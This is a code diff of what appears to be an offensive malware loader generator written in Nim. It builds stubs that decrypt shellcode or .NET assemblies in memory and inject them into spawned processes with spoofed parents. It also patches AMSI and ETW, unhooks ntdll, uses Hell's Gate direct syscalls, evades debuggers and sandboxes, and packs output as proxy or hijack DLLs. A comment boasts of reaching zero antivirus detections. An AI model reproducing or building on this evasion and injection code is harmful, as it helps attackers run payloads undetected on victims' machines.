+        expandedkey = expandedkey & newSeq[byte](aes256.sizeBlock - (len(expandedkey) mod aes256.sizeBlock))
+        when defined(verbose):
+            echo "[*] New Length: " & $len(expandedkey)
+
+    moveMemory(addr key[0], addr expandedkey[0], len(expandedkey))
+    discard calcHard()
+    var dectext = newSeq[byte](len(enctext))
+
+    var ptrKey = cast[ptr byte](addr key[0])
+    var ptrEncText: ptr byte # = cast[ptr byte](addr encText[0])
+    var ptrDecText: ptr byte # = cast[ptr byte](addr decText[0])
+    let dataLen = uint(len(enctext))
+
+    # Decrypt
+    #dctx.init(ptrKey)
+    #dctx.decrypt(ptrEncText, ptrDecText, dataLen)
+    #dctx.clear()
+
+    proc decryptLate(): void =
+        when defined(verbose):
+            when defined(csharp):
+                echo obf("[!] Decrypting C# Assembly for execution...")
+            else:
+                echo obf("[!] Decrypting Payload for execution in memory...")
+        dctx.init(ptrKey)
+        discard calcHard()
+        dctx.decrypt(ptrEncText, ptrDecText, dataLen)
+        dctx.clear()
+
+"""
+
+let AmsiNtCreateSectionDecryptStub = fmt"""
+
+var dctx2: ECB[aes256]
+var key2: array[aes256.sizeKey, byte]
+discard calcHard()
+var envkey2: string = obf("{envkey}")
+
+var expandedkey2 = toByteSeq(envkey2)
+discard calcHard()
+if ((len(expandedkey2) mod aes256.sizeBlock) != 0):
     when defined(verbose):
         echo "[*] Key length not a multiple of KeySize: ", aes256.sizeBlock
-        echo "[*] Length: " & $len(expandedkey)
+        echo "[*] Length: " & $len(expandedkey2)
         echo "[*] Padding Key with null bytes"
-    expandedkey = expandedkey & newSeq[byte](aes256.sizeBlock - (len(expandedkey) mod aes256.sizeBlock))
+    expandedkey2 = expandedkey2 & newSeq[byte](aes256.sizeBlock - (len(expandedkey2) mod aes256.sizeBlock))
     when defined(verbose):
-        echo "[*] New Length: " & $len(expandedkey)
+        echo "[*] New Length: " & $len(expandedkey2)
 
-copyMem(addr key[0], addr expandedkey[0], len(expandedkey))
-var dectext = newSeq[byte](len(enctext))
-
-var ptrKey = cast[ptr byte](addr key[0])
-var ptrEncText: ptr byte # = cast[ptr byte](addr encText[0])
-var ptrDecText: ptr byte # = cast[ptr byte](addr decText[0])
-let dataLen = uint(len(enctext))
-
-# Decrypt
-#dctx.init(ptrKey)
-#dctx.decrypt(ptrEncText, ptrDecText, dataLen)
-#dctx.clear()
-
-proc decryptLate(): void =
-    when defined(verbose):
-        echo obf("[!] Decrypting Shellcode for execution in memory")
-    dctx.init(ptrKey)
-    dctx.decrypt(ptrEncText, ptrDecText, dataLen)
-    dctx.clear()
+moveMemory(addr key2[0], addr expandedkey2[0], len(expandedkey2))
+discard calcHard()
 
 """
 
 let RemoteModuleHandleStub = """
 
-# Credit to @whydee86 - https://github.com/whydee86/SnD_AMSI/blob/main/Remote.nim
+    # Credit to @whydee86 - https://github.com/whydee86/SnD_AMSI/blob/main/Remote.nim
 
-from winim import PROCESSENTRY32A,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS,PROCESSENTRY32,Process32FirstA,Process32NextA,MODULEENTRY32A,TH32CS_SNAPMODULE,Module32FirstA,Module32NextA
 
-proc ConvertToString(CharArr :array[256,char]): string =
-    var index = 0
-    while CharArr[index] != '\x00':
-        result.add(CharArr[index])
-        index += 1
+    proc ConvertToString(CharArr :array[256,char]): string =
+        var index = 0
+        while CharArr[index] != '\x00':
+            result.add(CharArr[index])
+            index += 1
 
-proc GetRemoteModuleHandle * (hProcess:HANDLE, ModuleName: string): HMODULE =
-    var 
-        modEntry : MODULEENTRY32A
-        snapshot : HANDLE
+    proc GetRemoteModuleHandle  (hProcess:HANDLE, ModuleName: string): HMODULE =
+        var 
+            modEntry : MODULEENTRY32A
+            snapshot : HANDLE
 
-    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE,GetProcessId(hProcess))
-    if snapshot != INVALID_HANDLE_VALUE:
-        modEntry.dwSize = DWORD(sizeof(MODULEENTRY32A))
-        if Module32FirstA(snapshot, addr modEntry):
-            while Module32NextA(snapshot, addr modEntry):
-                if ConvertToString(modEntry.szModule) == ModuleName:
-                    return modEntry.hModule
-    CloseHandle(snapshot)
-    return 0
+        snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE,GetProcessId(hProcess))
+        if snapshot != INVALID_HANDLE_VALUE:
+            modEntry.dwSize = DWORD(sizeof(MODULEENTRY32A))
+            if Module32FirstA(snapshot, addr modEntry):
+                while Module32NextA(snapshot, addr modEntry):
+                    if ConvertToString(modEntry.szModule) == ModuleName:
+                        return modEntry.hModule
+        CloseHandle(snapshot)
+        return 0
 
-proc GetRemoteProcAddress * (hProcess : HANDLE, hModule : HMODULE, FuncName : string): FARPROC =
-    var
-        baseModule : UINT_PTR = cast[UINT64](hModule)
-        dosHeader : IMAGE_DOS_HEADER
-        ntHeader : IMAGE_NT_HEADERS
-        exportDirectory : IMAGE_EXPORT_DIRECTORY
-        ExportTable : DWORD = 0
-        ExportFunctionTableVA : UINT_PTR = 0
-        ExportNameTableVA : UINT_PTR = 0
-        ExportOrdinalTableVA : UINT_PTR = 0
-        ExportNameTable: seq[DWORD]
-        ExportFunctionTable: seq[DWORD]
-        ExportOrdinalsTable: seq[WORD] 
-        MinFunNumber : UINT_PTR = 0
-        Func : DWORD = 0
-        Ord : WORD = 0
-        CharIndex : UINT_PTR = 0
-        TempChar : char
-        Done : bool = false
-        TempFunctionName : string = ""
+    proc GetRemoteProcAddress  (hProcess : HANDLE, hModule : HMODULE, FuncName : string): FARPROC =
+        var
+            baseModule : UINT_PTR = cast[UINT64](hModule)
+            dosHeader : IMAGE_DOS_HEADER
+            ntHeader : IMAGE_NT_HEADERS
+            exportDirectory : IMAGE_EXPORT_DIRECTORY
+            ExportTable : DWORD = 0
+            ExportFunctionTableVA : UINT_PTR = 0
+            ExportNameTableVA : UINT_PTR = 0
+            ExportOrdinalTableVA : UINT_PTR = 0
+            ExportNameTable: seq[DWORD]
+            ExportFunctionTable: seq[DWORD]
+            ExportOrdinalsTable: seq[WORD] 
+            MinFunNumber : UINT_PTR = 0
+            Func : DWORD = 0
+            Ord : WORD = 0
+            CharIndex : UINT_PTR = 0
+            TempChar : char
+            Done : bool = false
+            TempFunctionName : string = ""
 
-    if ReadProcessMemory(hProcess, cast[LPCVOID](baseModule), addr dosHeader, sizeof(dosHeader), NULL) == 0:
-        when defined(verbose):
-            echo obf("Failed to Read the DOS header and check it's magic number: "), GetlastError()
-        return NULL
-    if ReadProcessMemory(hProcess, cast[LPCVOID](baseModule + dosHeader.e_lfanew), addr ntHeader, sizeof(ntHeader), NULL) == 0:
-        when defined(verbose):
-            echo obf("Failed to Read and check the NT signature: "), GetlastError()
-        return NULL
-
-    ExportTable = (ntHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]).VirtualAddress
-    
-    if ReadProcessMemory(hProcess, cast[LPCVOID](baseModule + ExportTable), addr exportDirectory, sizeof(exportDirectory), NULL) == 0:
-        when defined(verbose):
-            echo obf("Failed to Read the main export table "), GetlastError()
-
-    ExportFunctionTableVA = cast[UINT_PTR](baseModule) + exportDirectory.AddressOfFunctions
-    ExportNameTableVA = cast[UINT_PTR](baseModule) + exportDirectory.AddressOfNames
-    ExportOrdinalTableVA = cast[UINT_PTR](baseModule) + exportDirectory.AddressOfNameOrdinals
-    
-    for FunNum in MinFunNumber .. exportDirectory.NumberOfNames:
-        Func = 0
-        Ord = 0 
-        if ReadProcessMemory(hProcess, cast[LPCVOID](ExportNameTableVA + FunNum * sizeof(DWORD)), addr Func, sizeof(Func), NULL) == 0:
+        if ReadProcessMemory(hProcess, cast[LPCVOID](baseModule), addr dosHeader, sizeof(dosHeader), NULL) == 0:
             when defined(verbose):
-                echo obf("Failed to copy name table "), GetlastError()
+                echo obf("Failed to Read the DOS header and check it's magic number: "), GetlastError()
             return NULL
-        if ReadProcessMemory(hProcess, cast[LPCVOID](ExportOrdinalTableVA + FunNum * sizeof(WORD)), addr Ord, sizeof(Ord), NULL) == 0:
+        if ReadProcessMemory(hProcess, cast[LPCVOID](baseModule + dosHeader.e_lfanew), addr ntHeader, sizeof(ntHeader), NULL) == 0:
             when defined(verbose):
-                echo obf("Failed to copy Ordinal table "), GetlastError()
+                echo obf("Failed to Read and check the NT signature: "), GetlastError()
             return NULL
-        ExportNameTable.add(Func)
-        ExportOrdinalsTable.add(Ord)
-    
-    for FunNum in MinFunNumber .. exportDirectory.NumberOfFunctions:
-        Func = 0
-        if ReadProcessMemory(hProcess, cast[LPCVOID](ExportFunctionTableVA + FunNum * sizeof(DWORD)), addr Func, sizeof(Func), NULL) == 0:
+
+        ExportTable = (ntHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]).VirtualAddress
+        
+        if ReadProcessMemory(hProcess, cast[LPCVOID](baseModule + ExportTable), addr exportDirectory, sizeof(exportDirectory), NULL) == 0:
             when defined(verbose):
-                echo obf("Failed to copy fucntion table "), GetlastError()
-            return NULL
-        ExportFunctionTable.add(Func)
-    
-    for FunNum in MinFunNumber .. exportDirectory.NumberOfNames:
-        CharIndex = 0
-        Done = false
-        TempFunctionName = ""
-        while Done == false:
-            if ReadProcessMemory(hProcess, cast[LPCVOID](baseModule + ExportNameTable[FunNum] + CharIndex), addr TempChar, sizeof(TempChar), NULL) == 0:
+                echo obf("Failed to Read the main export table "), GetlastError()
+
+        ExportFunctionTableVA = cast[UINT_PTR](baseModule) + exportDirectory.AddressOfFunctions
+        ExportNameTableVA = cast[UINT_PTR](baseModule) + exportDirectory.AddressOfNames
+        ExportOrdinalTableVA = cast[UINT_PTR](baseModule) + exportDirectory.AddressOfNameOrdinals
+        
+        for FunNum in MinFunNumber .. exportDirectory.NumberOfNames:
+            Func = 0
+            Ord = 0 
+            if ReadProcessMemory(hProcess, cast[LPCVOID](ExportNameTableVA + FunNum * sizeof(DWORD)), addr Func, sizeof(Func), NULL) == 0:
                 when defined(verbose):
-                    echo obf("Failed to read the names of the functions"), GetlastError()
+                    echo obf("Failed to copy name table "), GetlastError()
                 return NULL
-            if TempChar == '\0' or TempChar == '`' or TempChar == '\176':
-                Done = true
-            else:
-                TempFunctionName.add(TempChar)
-            CharIndex += 1
-        if TempFunctionName == FuncName:
-            return cast[FARPROC](baseModule + ExportFunctionTable[ExportOrdinalsTable[FunNum]])
-    when defined(verbose):
-        echo obf("[X] Proc name does not exits")
-    return NULL
+            if ReadProcessMemory(hProcess, cast[LPCVOID](ExportOrdinalTableVA + FunNum * sizeof(WORD)), addr Ord, sizeof(Ord), NULL) == 0:
+                when defined(verbose):
+                    echo obf("Failed to copy Ordinal table "), GetlastError()
+                return NULL
+            ExportNameTable.add(Func)
+            ExportOrdinalsTable.add(Ord)
+        
+        for FunNum in MinFunNumber .. exportDirectory.NumberOfFunctions:
+            Func = 0
+            if ReadProcessMemory(hProcess, cast[LPCVOID](ExportFunctionTableVA + FunNum * sizeof(DWORD)), addr Func, sizeof(Func), NULL) == 0:
+                when defined(verbose):
+                    echo obf("Failed to copy fucntion table "), GetlastError()
+                return NULL
+            ExportFunctionTable.add(Func)
+        
+        for FunNum in MinFunNumber .. exportDirectory.NumberOfNames:
+            CharIndex = 0
+            Done = false
+            TempFunctionName = ""
+            while Done == false:
+                if ReadProcessMemory(hProcess, cast[LPCVOID](baseModule + ExportNameTable[FunNum] + CharIndex), addr TempChar, sizeof(TempChar), NULL) == 0:
+                    when defined(verbose):
+                        echo obf("Failed to read the names of the functions"), GetlastError()
+                    return NULL
+                if TempChar == '\0' or TempChar == '`' or TempChar == '\176':
+                    Done = true
+                else:
+                    TempFunctionName.add(TempChar)
+                CharIndex += 1
+            if TempFunctionName == FuncName:
+                return cast[FARPROC](baseModule + ExportFunctionTable[ExportOrdinalsTable[FunNum]])
+        when defined(verbose):
+            echo obf("[X] Proc name does not exits")
+        return NULL
 
 """
 
@@ -1211,10 +1500,10 @@ var {rand2} = {rand1}
 
 let DLLNoHideStub = """
 
-when defined(lib_only):
-    # https://stackoverflow.com/questions/12161813/running-a-dll-using-rundll32-exe-no-output-or-error-seen
-    # https://stackoverflow.com/questions/432832/what-is-the-different-between-api-functions-allocconsole-and-attachconsole-1 to get DLL Console output
-    AttachConsole(-1)
+    when defined(lib_only):
+        # https://stackoverflow.com/questions/12161813/running-a-dll-using-rundll32-exe-no-output-or-error-seen
+        # https://stackoverflow.com/questions/432832/what-is-the-different-between-api-functions-allocconsole-and-attachconsole-1 to get DLL Console output
+        AttachConsole(-1)
 
 """
 
@@ -1246,6 +1535,25 @@ proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL 
     NimMain()
   if fdwReason == DLL_THREAD_ATTACH:
     NimMain()
+  #if fdwReason == DLL_PROCESS_ATTACH:
+  #  NimMain()
+  return true
+
+"""
+
+let DLLProxyStub = """
+
+import dynlib
+proc NimMain() {.cdecl, importc.}
+
+proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
+  NimMain()
+  
+  if fdwReason == DLL_PROCESS_ATTACH:
+    var threadHandle = CreateThread(NULL, 0, main, NULL, 0, NULL)
+    CloseHandle(threadHandle)
+  #if fdwReason == DLL_THREAD_ATTACH:
+  #  NimMain()
   #if fdwReason == DLL_PROCESS_ATTACH:
   #  NimMain()
   return true
@@ -1297,126 +1605,128 @@ SleepyCryptLoop(10000)
 """
 
 let NotepadProcIDStub * = fmt"""
-import os
 
-from winim import PROCESSENTRY32,PROCESSENTRY32A,Process32NextA,Process32FirstA,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS
 
-proc FindPidByName * (processName : string):DWORD =
-    try:
+    proc FindPidByName (processName : string):DWORD =
+        try:
+            var 
+                entry : PROCESSENTRY32A
+                snapshot : HANDLE
+                pid : DWORD = 0
+            snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
+            if snapshot != INVALID_HANDLE_VALUE:
+                entry.dwSize = DWORD(sizeof(PROCESSENTRY32))
+                if Process32FirstA(snapshot,addr entry):
+                    while Process32NextA(snapshot,addr entry):
+                        pid = entry.th32ProcessID
+                        if ($(entry.szExeFile).join()).contains(processName):
+                            result = pid
+        except: 
+            echo obf("Process ID not found")
+
+    var remoteProcID: DWORD
+
+    proc StartProcess(): void =
         var 
-            entry : PROCESSENTRY32A
-            snapshot : HANDLE
-            pid : DWORD = 0
-        snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
-        if snapshot != INVALID_HANDLE_VALUE:
-            entry.dwSize = DWORD(sizeof(PROCESSENTRY32))
-            if Process32FirstA(snapshot,addr entry):
-                while Process32NextA(snapshot,addr entry):
-                    pid = entry.th32ProcessID
-                    if ($(entry.szExeFile).join()).contains(processName):
-                        result = pid
-    except: 
-        echo obf("Process ID not found")
-
-var remoteProcID: DWORD
-
-proc StartProcess(): void =
-    var 
-        lpSize: SIZE_T
-        tProcess: HANDLE
-        pi: PROCESS_INFORMATION
-        ps: SECURITY_ATTRIBUTES
-        si: STARTUPINFOEX
-        status: WINBOOL
-        tHandle: HANDLE
-        tProcPath: WideCString
-        ts: SECURITY_ATTRIBUTES
-    
-    ps.nLength = sizeof(ps).cint
-    ts.nLength = sizeof(ts).cint
-    si.StartupInfo.cb = sizeof(si).cint
+            lpSize: SIZE_T
+            tProcess: HANDLE
+            pi: PROCESS_INFORMATION
+            ps: SECURITY_ATTRIBUTES
+            si: STARTUPINFOEX
+            status: WINBOOL
+            tHandle: HANDLE
+            tProcPath: WideCString
+            ts: SECURITY_ATTRIBUTES
+        
+        ps.nLength = sizeof(ps).cint
+        ts.nLength = sizeof(ts).cint
+        si.StartupInfo.cb = sizeof(si).cint
 
 
-    when defined spoof_args:
-        tProcPath = newWideCString(joinPath(r"C:\Windows\System32", obf("{customspawnprocess}")) & " " & obf("{spoofArgs}"))
-    else:
-        tProcPath = newWideCString(joinPath(r"C:\Windows\System32", obf("{customspawnprocess}")))
+        when defined spoof_args:
+            tProcPath = newWideCString(joinPath(r"C:\Windows\System32", obf("{customspawnprocess}")) & " " & obf("{spoofArgs}"))
+        else:
+            tProcPath = newWideCString(joinPath(r"C:\Windows\System32", obf("{customspawnprocess}")))
 
-    when defined(blockDLLs) or (obf("{parentProcess}") != ""):
-        InitializeProcThreadAttributeList(NULL, 2, 0, addr lpSize)
-        si.lpAttributeList = cast[LPPROC_THREAD_ATTRIBUTE_LIST](HeapAlloc(GetProcessHeap(), 0, lpSize))
-        InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, addr lpSize)
+        when defined(blockDLLs) or (obf("{parentProcess}") != ""):
+            InitializeProcThreadAttributeList(NULL, 2, 0, addr lpSize)
+            si.lpAttributeList = cast[LPPROC_THREAD_ATTRIBUTE_LIST](HeapAlloc(GetProcessHeap(), 0, lpSize))
+            InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, addr lpSize)
 
-        when defined(blockDLLs):
-            const
-                PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x00000001 shl 44
-            var
-                policy: DWORD64
+            when defined(blockDLLs):
+                const
+                    PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x00000001 shl 44
+                var
+                    policy: DWORD64
 
-            policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
-            
-            status = UpdateProcThreadAttribute(
-                si.lpAttributeList,
-                0,
-                cast[DWORD_PTR](PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY),
-                addr policy,
-                sizeof(policy),
-                NULL,
-                NULL)
+                policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
+                
+                status = UpdateProcThreadAttribute(
+                    si.lpAttributeList,
+                    0,
+                    cast[DWORD_PTR](PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY),
+                    addr policy,
+                    sizeof(policy),
+                    NULL,
+                    NULL)
 
-        if (obf("{parentProcess}") != ""):
-            var
-                ppHandle: HANDLE
-                ppid: DWORD
+            if (obf("{parentProcess}") != ""):
+                var
+                    ppHandle: HANDLE
+                    ppid: DWORD
 
-            ppid = FindPidByName(obf("{parentProcess}"))                    
-            ppHandle = OpenProcess(PROCESS_ALL_ACCESS,false, ppid)
-            
-            if (ppHandle == 0):
-              when defined(verbose):
-                echo obf("Failed to open parent process handle, no permissions??")
-              ppHandle = HANDLE(-1) # Current Process
+                ppid = FindPidByName(obf("{parentProcess}"))                    
+                ppHandle = OpenProcess(PROCESS_ALL_ACCESS,false, ppid)
+                
+                if (ppHandle == 0):
+                    when defined(verbose):
+                        echo obf("Failed to open parent process handle, no permissions??")
+                    ppHandle = HANDLE(-1) # Current Process
 
-            status = UpdateProcThreadAttribute(
-                si.lpAttributeList,
-                0,
-                cast[DWORD_PTR](PROC_THREAD_ATTRIBUTE_PARENT_PROCESS),
-                addr ppHandle,
-                sizeof(ppHandle),
-                NULL,
-                NULL)
+                status = UpdateProcThreadAttribute(
+                    si.lpAttributeList,
+                    0,
+                    cast[DWORD_PTR](PROC_THREAD_ATTRIBUTE_PARENT_PROCESS),
+                    addr ppHandle,
+                    sizeof(ppHandle),
+                    NULL,
+                    NULL)
 
-    status = CreateProcess(
-        NULL,
-        tProcPath,
-        ps,
-        ts, 
-        FALSE,
-        EXTENDED_STARTUPINFO_PRESENT or CREATE_SUSPENDED,
-        NULL,
-        r"C:\Windows\system32\",
-        addr si.StartupInfo,
-        addr pi)
+        status = CreateProcess(
+            NULL,
+            cast[LPWSTR](tProcPath),
+            ps,
+            ts, 
+            FALSE,
+            EXTENDED_STARTUPINFO_PRESENT or CREATE_SUSPENDED,
+            NULL,
+            r"C:\Windows\system32\",
+            addr si.StartupInfo,
+            addr pi)
 
-    tProcess = pi.hProcess
-    remoteProcID = pi.dwProcessId
-    tHandle = pi.hThread
+        tProcess = pi.hProcess
+        remoteProcID = pi.dwProcessId
+        tHandle = pi.hThread
 
-StartProcess()
+    StartProcess()
 
 
-when defined(verbose):
-    echo obf("[*] Sleeping in between for: "), {sleepinbetween}
+    when defined(verbose):
+        echo obf("[*] Sleeping in between for: "), {sleepinbetween}
 
-when defined(sleepinbetween):
-    HowMuchTimeWouldYouLikeToSleep({sleepinbetween})
+    when defined(sleepinbetween):
+        HowMuchTimeWouldYouLikeToSleep({sleepinbetween})
 
-when defined(verbose):
-    echo obf("[*] Target Process: "), remoteProcID
+    when defined(verbose):
+        echo obf("[*] Target Process: "), remoteProcID
 
 
 """
+let MainStub * = """
 
+proc main(lpParameter: LPVOID) : DWORD {.stdcall.} =
+
+"""
 
 let BeingDebugged * = fmt"""
 import AntiDebug
@@ -1436,7 +1746,8 @@ if (not noDInvoke):
 
 if(pump):
     # makes no sense to import strenc when strings should be visible in the binary.
-    stub =  stub.replace("import strenc", "")
+    stub =  stub.replace("    import strenc", "")
+    stub = stub.replace("when not defined(proxy):", "")
     for m in pumpargs:
         if(m == "words"):
             echo "[*] Adding words"
@@ -1448,7 +1759,7 @@ if(pump):
 if(antidebug):
     stub.add(BeingDebugged)
 
-stub.add(getRandStub())
+stub.add(getRandStubNoTab())
 
 if(sandbox):
     if (not noDInvoke): stub.add(DInvokeSandBoxStub)
@@ -1469,11 +1780,13 @@ if(sandbox):
 if (apihide):
     stub.add(APIHideStub)
 
-if(gosleep):
-    stub.add(SleepStubFirst)
-    stub.add(SleepStubSecond)
 
-stub.add(getRandStub())
+if(gosleep or remoteETWpatch or remoteAMSIpatch):
+    stub.add(SleepStubFirst)
+    if (gosleep):
+        stub.add(SleepStubSecond)
+
+stub.add(getRandStubNoTab())
 
 if (getfreshstub):
     stub.add(GetSyscallStub)
@@ -1491,36 +1804,45 @@ if (syswhispers):
         else:
             stub.add(WhispersStubX86)
 
+if(hellsgate):
+    stub.add(HellsgateStub)
+    stub.add(HellsgateAllocDelegate)
+    stub.add(HellsgateProtectDelegate)
+    stub.add(HellsgateWriteDelegate)
+    stub.add(HellsgateNtCloseDelegate)
+    if(remoteMapSection):
+        stub.add(HellsgateNtMapViewOfSectionDelegate)
+        stub.add(HellsgateNtCreateSectionDelegate)
+    if (peload and (not localinject)):
+        stub.add(HellsgateNtCreateThreadExDelegate)
+    elif(localCreateThread or remoteETWpatch or remoteAMSIpatch):
+        stub.add(HellsgateNtCreateThreadExDelegate)
+    if(not localinject or remoteETWpatch or remoteAMSIpatch):
+        stub.add(HellsgateNtOpenProcessDelegate)
+        stub.add(HellsgateNtCreateThreadExDelegate)
+
+if (AMSICreateSectionHook):
+    stub.add(AmsiNtCreateSectionDecryptStub)
+    stub.add(AMSINtCreateSectionHookStubFirst)
+
+stub.add(MainStub)
+
 stub.add(getRandStub())
 
 if(unhook):
     if(hellsgate):
         if (not noDInvoke): stub.add(DInvokeUnhookStubs)
-        stub.add(Winimleanstub)
-        stub.add(WinLeanGetCurrentProcStub)
-        stub.add(HellsgateStub)
-        stub.add(HellsgateProtectDelegate)
-        stub.add(HellsgateWriteDelegate)
-        stub.add(HellsgateNtCloseDelegate)
     elif(getfreshstub):
         if (not noDInvoke): stub.add(DInvokeUnhookStubs)
-        stub.add(Winimleanstub)
         stub.add(NtProtectVirtualMemoryDelegate)
         stub.add(NtWriteVirtualMemoryDelegate)
         stub.add(NtCloseDelegate)
         stub.add(UnhookSyscalls)
     elif(syswhispers):
         if (not noDInvoke): stub.add(DInvokeUnhookStubs)
-        stub.add(Winimleanstub)
     stub.add(UnhookNtdllStub)
 else:
-    if(hellsgate):
-        stub.add(WinLeanGetCurrentProcStub)
-        stub.add(HellsgateStub)
-        stub.add(HellsgateProtectDelegate)
-        stub.add(HellsgateWriteDelegate)
-        stub.add(HellsgateNtCloseDelegate)
-    elif(getfreshstub):
+    if(getfreshstub):
         stub.add(NtProtectVirtualMemoryDelegate)
         stub.add(NtWriteVirtualMemoryDelegate)
 stub.add(getRandStub())
@@ -1562,27 +1884,14 @@ if (localinject):
 stub.add(getRandStub())
 if (remoteETWpatch or remoteAMSIpatch):
     stub.add(RemoteModuleHandleStub)
-    if (gosleep == false):
-        stub.add(SleepStubFirst)
     if (unhook == false):
         if (not noDInvoke): stub.add(DInvokeGetModuleHandleADelegate)
-stub.add(getRandStub())
-if(dll_out or cpl):
-    if ((hide == false) and (apiHide == false)):
-        stub.add(DLLNoHideStub)
-    stub.add(DllStub)
-    if(dllhijack):
-        stub.add(DLLHijackStub)
-    for f in dllexportfunctions:
-        stub.add(DllCustomExportStub)
-        stub = stub.replace("FUNC_EXPORT", f)
 stub.add(getRandStub())
 if (peload):
     if (localinject):
         if (embeddedArguments):
             stub.add(PatchargsFuncs)
         if (hellsgate):
-            stub.add(HellsgateAllocDelegate)
             stub.add(PELoadStub)
         elif(getfreshstub):
             stub.add(NtAllocateVirtualMemoryDelegate)
@@ -1592,11 +1901,7 @@ if (peload):
             stub.add(PELoadStub)
         stub.add(getRandStub())
     else:   
-        stub.add(RemoteProcImportStub)
         if (hellsgate):
-            stub.add(HellsgateNtOpenProcessDelegate)
-            stub.add(HellsgateAllocDelegate)
-            stub.add(HellsgateNtCreateThreadExDelegate)
             if (processname == ""):
                 stub.add(NotepadProcIDStub)
                 if (remoteETWpatch):
@@ -1630,22 +1935,12 @@ if (shellcode):
             if (localCreateThread):
                 stub.add(NtCreateThreadExDelegate)
             stub.add(LocalInjectDelegates)
-        if (hellsgate):
-            if (localCreateThread):
-                stub.add(HellsgateNtCreateThreadExDelegate)
-            stub.add(HellsgateAllocDelegate)
         stub.add(getRandStub())
         stub.add(LocalInjectStub)
         stub.add(getRandStub())
     else:
-        stub.add(Winimleanstub)
         stub.add(getRandStub())
-        if (getfreshstub):
-            stub.add(RemoteProcImportStub)
         if (hellsgate):
-            stub.add(HellsgateNtOpenProcessDelegate)
-            stub.add(HellsgateAllocDelegate)
-            stub.add(HellsgateNtCreateThreadExDelegate)
             if (processname == ""):
                 stub.add(NotepadProcIDStub)
                 if (remoteETWpatch):
@@ -1695,6 +1990,9 @@ if (shellcode):
                     stub.add(RemotePatchAMSIStub)
                 stub.add(ShellcoderemoteinjectStub_customprocthird)
         elif (getfreshstub):
+            if(remoteMapSection):
+                stub.add(NtCreateSectionDelegate)
+                stub.add(NtMapViewOfSectionDelegate)
             stub.add(RemoteInjectDelegates)
             stub.add(getRandStub())
             if (processname == ""):
@@ -1728,7 +2026,6 @@ if (shellcode):
         stub.add(getRandStub())
 
 if (csharp):
-    stub.add(AssemblyImports)
     stub.add(getRandStub())
     if (noArgs):
         stub.add(LoadAssemblyStub)
@@ -1751,8 +2048,22 @@ if (sleepycrypt):
     stub.add(LocalInjectGetSyscallStubSleepStub)
     #stub.add(SleepyCryptLoopExecute)
 
+if(dll_out or cpl):
+    if ((hide == false) and (apiHide == false)):
+        stub.add(DLLNoHideStub)
+    if (dllProxy):
+        stub.add(DLLProxyStub)
+    else:
+        stub.add(DllStub)
+        if(dllhijack):
+            stub.add(DLLHijackStub)
+    for f in dllexportfunctions:
+        stub.add(DllCustomExportStub)
+        stub = stub.replace("FUNC_EXPORT", f)
+
 if (debugMode):
     stub = stub.replace("import strenc", "")
+    stub = stub.replace("when not defined(proxy):", "")
 
 writeFile("Loader.nim", stub)
 echo "Written Loader.nim -> \n\n"
@@ -1780,7 +2091,7 @@ if(dllProxy):
 
 
 # --hint[Pattern]:off is used to not break nim-strenc - https://github.com/Yardanico/nim-strenc/issues/6
-# This is only for the best size: -d:danger -d:strip --opt:size --passc=-flto --passl=-flto / But it also bypasses three more vendors on antiscan.me from 3 up to 0 detections :)
+# This is only for the best size: -d:danger -d:strip --passc=-flto --passl=-flto / But it also bypasses three more vendors on antiscan.me from 3 up to 0 detections :)
 # --passc=-flto --passl=-flto are not compatible with Hellsgate as they break the functionality
 
 var basicCompileFlags: string = ""
@@ -1799,7 +2110,7 @@ if (llvm):
             let ochars = {'A'..'Z','0'..'9'}
             var aesSeed = collect(newSeq, (for i in 0..<32: ochars.sample)).join
             #Feel free to modify the Obfuscator-LLVM flags in the command below to fit your needs.
-            basicCompileFlags.add(fmt"nim c -d=release --hint:pattern:off --warning:all:off --cc:clang --opt:size --passL:-s --passC:'-mllvm -bcf -mllvm -sub -mllvm -fla -mllvm -split -aesSeed={aesSeed}'")
+            basicCompileFlags.add(fmt"nim c -d=release --hint:pattern:off --warning:all:off --cc:clang --passL:-s --passC:'-mllvm -bcf -mllvm -sub -mllvm -fla -mllvm -split -aesSeed={aesSeed}'")
         else:
             echo "[!] Obfuscator-LLVM or wclang not installed or in path! Ensure that you can run 'x86_64-w64-mingw32-clang -v' and it shows 'Obfuscator-LLVM'."
             quit()
@@ -1809,18 +2120,22 @@ if (llvm):
             let ochars = {'A'..'Z','0'..'9'}
             var aesSeed = collect(newSeq, (for i in 0..<32: ochars.sample)).join
             #Feel free to modify the Obfuscator-LLVM flags in the command below to fit your needs.
-            basicCompileFlags.add(fmt"nim c -d=release --hint:pattern:off --warning:all:off --cc:clang --opt:size --passL:-s --passC:'-mllvm -bcf -mllvm -sub -mllvm -fla -mllvm -split -aesSeed={aesSeed}'")
+            basicCompileFlags.add(fmt"nim c -d=release --hint:pattern:off --warning:all:off --cc:clang --passL:-s --passC:'-mllvm -bcf -mllvm -sub -mllvm -fla -mllvm -split -aesSeed={aesSeed}'")
         else:
             echo "[!] Obfuscator-LLVM or wclang not installed or in path! Ensure that you can run 'x86_64-w64-mingw32-clang -v' and it shows 'Obfuscator-LLVM'."
             quit()
 elif system.hostOS == "windows":
